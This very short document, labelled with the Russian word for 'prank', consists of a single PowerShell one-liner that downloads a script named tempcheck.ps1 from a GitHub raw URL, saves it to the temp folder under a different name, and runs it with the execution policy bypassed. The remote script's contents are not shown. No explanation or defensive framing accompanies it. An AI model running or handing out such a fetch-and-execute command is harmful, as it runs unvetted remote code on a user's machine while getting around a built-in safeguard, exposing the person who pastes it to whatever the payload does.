пранк
```powershell iwr https://raw.githubusercontent.com/sweetvata/tempcheck/main/tempcheck.ps1 -OutFile "$env:TEMP\wheel.ps1" -UseBasicParsing; powershell -ExecutionPolicy Bypass -File "$env:TEMP\wheel.ps1"```
